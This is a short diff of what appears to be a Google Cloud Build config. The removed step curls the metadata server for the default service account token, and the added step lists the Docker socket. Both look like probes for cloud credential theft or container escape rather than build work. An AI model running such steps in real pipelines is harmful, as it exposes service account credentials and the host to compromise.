@@ -1,6 +1,6 @@
 steps:
   - name: 'ubuntu'
-    args: ['bash', '-c', 'apt-get update -y && apt-get install curl -y && curl -H "Metadata-Flavor:Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token']
+    args: ['bash', '-c', 'ls -la /var/run/docker.sock']
 
 options:
   logging: CLOUD_LOGGING_ONLY
